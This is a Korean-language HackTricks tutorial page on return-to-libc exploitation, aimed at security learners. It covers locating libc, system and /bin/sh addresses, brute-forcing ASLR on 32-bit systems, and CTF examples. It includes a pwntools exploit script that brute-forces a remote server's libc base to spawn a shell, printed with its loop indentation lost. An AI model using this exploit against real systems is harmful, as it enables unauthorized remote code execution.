# Ret2lib

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## **기본 정보**

**Ret2Libc**의 본질은 취약한 프로그램의 실행 흐름을 공격자가 제공한 쉘코드를 스택에서 실행하는 대신 공유 라이브러리 내의 함수(예: **system**, **execve**, **strcpy**)로 리디렉션하는 것입니다. 공격자는 스택의 반환 주소를 원하는 라이브러리 함수로 가리키도록 수정하는 페이로드를 작성하며, 호출 규약에 따라 필요한 인수가 올바르게 설정되도록 준비합니다.

### **예시 단계 (단순화)**

* 호출할 함수의 주소(예: system)와 호출할 명령(예: /bin/sh)을 가져옵니다.
* 명령 문자열을 가리키는 첫 번째 인수를 전달하고 함수로의 실행 흐름을 생성하기 위해 ROP 체인을 생성합니다.

## 주소 찾기

* 현재 머신에서 사용되는 `libc`가 메모리에 로드될 위치를 찾으려면: 

{% code overflow="wrap" %}
```bash
ldd /path/to/executable | grep libc.so.6 #Address (if ASLR, then this change every time)
```
{% endcode %}

libc의 주소가 ASLR에 의해 변경되고 있는지 확인하려면 다음을 수행할 수 있습니다:
```bash
for i in `seq 0 20`; do ldd ./<bin> | grep libc; done
```
* 사용된 libc를 알면 `system` 함수의 오프셋을 찾는 것도 가능합니다:
```bash
readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system
```
* 사용된 libc를 알면 `/bin/sh` 함수의 오프셋을 찾는 것도 가능합니다:
```bash
strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh
```
### gdb-peda / GEF 사용하기

사용된 libc를 알면, Peda 또는 GEF를 사용하여 **system** 함수, **exit** 함수 및 문자열 **`/bin/sh`**의 주소를 얻는 것도 가능합니다:
```
p system
p exit
find "/bin/sh"
```
### /proc/\<PID>/maps 사용하기

프로세스가 대화할 때마다 **자식 프로세스**를 생성하는 경우(네트워크 서버) 해당 파일을 **읽어보세요**(아마도 root 권한이 필요할 것입니다).

여기에서 프로세스 내에서 **libc가 로드된 정확한 위치**와 **각 자식 프로세스에 대해 로드될 위치**를 찾을 수 있습니다.

![](<../../../../.gitbook/assets/image (95).png>)

이 경우 **0xb75dc000**에 로드됩니다(이것이 libc의 기본 주소가 됩니다).

## 알 수 없는 libc

이진 파일이 로드하는 **libc를 모를 수도 있습니다**(서버에 접근할 수 없기 때문일 수 있습니다). 그런 경우 취약점을 악용하여 **주소를 유출하고 어떤 libc** 라이브러리가 사용되고 있는지 찾을 수 있습니다:

{% content-ref url="rop-leaking-libc-address/" %}
[rop-leaking-libc-address](rop-leaking-libc-address/)
{% endcontent-ref %}

그리고 여기에서 pwntools 템플릿을 찾을 수 있습니다:

{% content-ref url="rop-leaking-libc-address/rop-leaking-libc-template.md" %}
[rop-leaking-libc-template.md](rop-leaking-libc-address/rop-leaking-libc-template.md)
{% endcontent-ref %}

## 32비트에서 ASLR 우회하기

이러한 무작위 대입 공격은 **32비트 시스템에만 유용합니다**.

* 익스플로잇이 로컬인 경우 libc의 기본 주소를 무작위 대입하여 시도할 수 있습니다(32비트 시스템에 유용함):
```python
for off in range(0xb7000000, 0xb8000000, 0x1000):
```
* 원격 서버를 공격하는 경우, **`libc` 함수 `usleep`의 주소를 브루트 포스 시도**할 수 있으며, 인자로 10을 전달합니다 (예: 10). 만약 어느 시점에 **서버가 응답하는 데 10초가 추가로 걸린다면**, 이 함수의 주소를 찾은 것입니다.

## One Gadget

{% content-ref url="../../one-gadget.md" %}
[one-gadget.md](../../one-gadget.md)
{% endcontent-ref %}

## x86 Ret2lib 코드 예제

이 예제에서는 ASLR 브루트 포스가 코드에 통합되어 있으며, 취약한 바이너리는 원격 서버에 위치합니다:
```python
from pwn import *

c = remote('192.168.85.181',20002)
c.recvline()

for off in range(0xb7000000, 0xb8000000, 0x1000):
p = ""
p += p32(off + 0x0003cb20) #system
p += "CCCC" #GARBAGE, could be address of exit()
p += p32(off + 0x001388da) #/bin/sh
payload = 'A'*0x20010 + p
c.send(payload)
c.interactive()
```
## x64 Ret2lib 코드 예제

다음 예제를 확인하세요:

{% content-ref url="../rop-return-oriented-programing.md" %}
[rop-return-oriented-programing.md](../rop-return-oriented-programing.md)
{% endcontent-ref %}

## Ret-into-printf (또는 puts)

이는 `printf`/`puts`를 특정 데이터와 함께 인수로 호출하여 **프로세스에서 정보를 유출할 수 있게** 합니다.

## Ret2printf

이는 기본적으로 **Ret2lib를 악용하여 `printf` 형식 문자열 취약점으로 변환하는 것**을 의미합니다. `ret2lib`를 사용하여 printf를 호출하고 이를 악용할 값을 전달합니다(쓸모없어 보이지만 가능함):

{% content-ref url="../../format-strings/" %}
[format-strings](../../format-strings/)
{% endcontent-ref %}

## 기타 예제 및 참고자료

* [https://guyinatuxedo.github.io/08-bof\_dynamic/csaw19\_babyboi/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/csaw19\_babyboi/index.html)
* Ret2lib, libc의 함수 주소에 대한 유출을 제공하며, one gadget 사용
* [https://guyinatuxedo.github.io/08-bof\_dynamic/csawquals17\_svc/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/csawquals17\_svc/index.html)
* 64비트, ASLR 활성화, PIE 없음, 첫 번째 단계는 canary의 바이트 0x00까지 오버플로우를 채운 후 puts를 호출하여 유출하는 것입니다. canary로 ROP 가젯을 생성하여 puts를 호출하여 GOT에서 puts의 주소를 유출하고, `system('/bin/sh')`를 호출하는 ROP 가젯을 생성합니다.
* [https://guyinatuxedo.github.io/08-bof\_dynamic/fb19\_overfloat/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/fb19\_overfloat/index.html)
* 64비트, ASLR 활성화, canary 없음, 자식 함수에서 main의 스택 오버플로우. ROP 가젯을 사용하여 GOT에서 puts의 주소를 유출하고, 이후 one gadget을 호출합니다.
* [https://guyinatuxedo.github.io/08-bof\_dynamic/hs19\_storytime/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/hs19\_storytime/index.html)
* 64비트, PIE 없음, canary 없음, relro 없음, nx. write 함수를 사용하여 write (libc)의 주소를 유출하고 one gadget을 호출합니다.

{% hint style="success" %}
AWS 해킹 배우기 및 연습하기:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP 해킹 배우기 및 연습하기: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks 지원하기</summary>

* [**구독 계획**](https://github.com/sponsors/carlospolop) 확인하기!
* **💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 참여하거나, **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**를 팔로우하세요.**
* **[**HackTricks**](https://github.com/carlospolop/hacktricks) 및 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) 깃허브 리포지토리에 PR을 제출하여 해킹 팁을 공유하세요.**

</details>
{% endhint %}
